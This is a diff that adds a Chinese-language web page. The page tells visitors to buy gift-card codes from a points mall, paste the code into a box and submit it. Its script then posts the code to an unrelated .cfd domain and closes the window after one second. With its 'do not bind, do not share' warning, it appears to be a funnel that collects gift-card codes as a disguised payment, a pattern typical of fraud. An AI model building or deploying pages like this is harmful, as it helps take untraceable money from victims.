@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Document</title>
+    <style>
+        .center {
+            text-align: center;
+            font-family: 等线;
+            font-size: 10.5pt;
+            margin: 0cm;
+            line-height: 10;
+        }
+        .red {
+            color: red;
+        }
+        .blue {
+            color: #0070C0;
+        }
+        .black {
+            color: black;
+        }
+        .input-field {
+            height: 58pt;
+            width: 550px;
+            border: 2.3px solid black;
+            text-align: center;
+            font-size: 28px;
+        }
+        .input-field::placeholder {
+            text-align: center;
+            font-size: 45px;
+        }
+        .flex-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .input-field {
+            height: 58pt;
+            width: 550px;
+            border: 2.3px solid black;
+            text-align: center;
+            font-size: 37px;  /* 这里设置输入框的字体大小 */
+        }
+        /* 其他样式... */
+    </style>
+</head>
+<body>
+    <p class="center" style="font-size: 36pt; line-height: 1.8;"><span class="red" style="font-family: 黑体; font-size: 77.3333px;">请勿点绑定-请勿点分享</span></p>
+    <div class="flex-container" style="line-height: 1.8;">
+        <input class="input-field" type="text" id="cardNumber" placeholder="粘贴复制卡密到这里">
+        <!-- 隐藏的merchantOrderId输入字段，值应由服务器动态生成或通过JavaScript设置 -->
+        <input type="hidden" id="merchantOrderId" value="{{merchantOrderId}}">
+        <span id="submit-button" class="red" style="font-size: 58pt;"><span style="font-family: 黑体; font-size: 52pt;">&ensp;提交</span></span>
+    </div>
+    <p class="center" style="font-size: 24pt; line-height: 1.8;"><span style="font-family: 黑体;"><a href="https://service.jifenfu.net/sspmall-front/index.html#/GiftCardTheme?batchId=1698969229230747650&cashPrice=10000" class="red"><span style="font-size: 65px;">绑定成功点击这里购买卡密</span></a></span></p>
+    <p class="center" style="font-size: 24pt; line-height: 1.8;"><span style="font-family: 黑体;"><span style="font-size: 60px;">订单金额：{{order_amount}}</span></span></p>
+    <p class="center" style="font-size: 24pt; line-height: 1.2;"><a href="{{number}}" class="blue" style="font-size: 26pt; font-family: 黑体;"><span style="font-size: 57px;">第一次购买先点击这里绑定帐号</span></a><br>
+    <a href="https://service.jifenfu.net/sspmall-front/index.html#/login?entryCode=142a72afb63044b1b7369476a8e59704&loginPageSettingsId=1200367068272386049&authCode=sms&openRegister=1" style="color: rgb(0, 112, 192); font-family: 黑体; font-size: 34.6667px;"><span style="font-size: 57px;">第二次购买无须点这里</span></a><br>
+</p>
+<p class="center" style="font-size: 24pt; line-height: 1.8;"><span class="black" style="font-size: 60px; font-family: 黑体;">请跟下图步骤支付</span></p>
+<div style="display: flex; justify-content: center;">
+    <img src="1.jpg" alt="图片描述" style="max-width: 100%; display: block; margin: auto;">
+</div>
+<p class="center" style="font-size: 24pt; line-height: 1.8;"><span class="black" style="font-size: 60px; font-family: 黑体;">
+</span></p>
+<div style="display: flex; justify-content: center;">
+    <img src="/uploads/20231007/2023100703112174683.jpg" style="max-width:100%;" border="0">
+</div>
+<br>
+<p></p>
+<p class="center" style="font-size: 24pt; line-height: 1.8;"><span class="black" style="font-size: 60px; font-family: 黑体;"><br>
+</span></p>
+<!-- 其他内容... -->
+<script>
+    document.querySelector('#submit-button').addEventListener('click', function() {
+        var inputField = document.querySelector('.input-field');
+        var merchantOrderIdField = document.querySelector('#merchantOrderId'); // 获取merchantOrderId的元素
+        if (inputField.value !== '') {
+            // 构造FormData对象
+            var formData = new FormData();
+            formData.append('cardNumber', inputField.value);
+            // 从隐藏的input字段读取merchantOrderId的值
+            formData.append('merchantOrderId', merchantOrderIdField.value); // 使用实际的merchantOrderId值
+
+            // 发送数据到服务器
+            fetch('https://gdpw.cfd/hhpn.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Success:', data);
+                // 原有的成功逻辑
+                this.innerHTML = '&ensp;成功';
+                inputField.disabled = true;
+                alert('提交后请耐心等待，窗口1秒后会自动关闭');
+                setTimeout(function() {
+                    window.close();
+                }, 1000);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        } else {
+            alert('请输入卡密');
+        }
+    });
+</script>
+</body>
+</html>
